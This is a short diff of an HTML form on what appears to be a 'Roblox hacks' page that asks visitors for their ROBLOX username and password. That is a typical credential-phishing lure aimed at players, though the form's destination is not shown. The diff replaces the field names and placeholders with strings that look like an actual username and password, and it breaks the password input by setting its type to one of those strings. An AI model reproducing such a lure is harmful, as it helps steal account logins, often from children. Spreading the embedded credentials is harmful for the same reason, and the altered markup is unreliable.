@@ -11,18 +11,18 @@ Hacks
 
 <!-- Text input-->
 <div class="control-group">
-  <label class="control-label" for="ROBLOX username">ROBLOX Username</label>
+  <label class="control-label" for="FantasticRobloxian10">ROBLOX Username</label>
   <div class="controls">
-    <input id="ROBLOX username" name="ROBLOX username" type="text" placeholder="Username" class="input-xlarge" required="">
+    <input id="FantasticRobloxian10" name="FantasticRobloxian10" type="text" placeholder="FantasticRobloxian10" class="input-xlarge" required="">
     
   </div>
 </div>
 
 <!-- Password input-->
 <div class="control-group">
-  <label class="control-label" for="ROBLOX Password">ROBLOX Password</label>
+  <label class="control-label" for="Crazygamerdaniel104">ROBLOX Password</label>
   <div class="controls">
-    <input id="ROBLOX Password" name="ROBLOX Password" type="password" placeholder="Password" class="input-xlarge" required="">
+    <input id="Crazygamerdaniel104" name="Crazygamerdaniel104" type="Crazygamerdaniel104" placeholder="Crazygamerdaniel104" class="input-xlarge" required="">
     <p class="help-block"> </p>
   </div>
 </div>
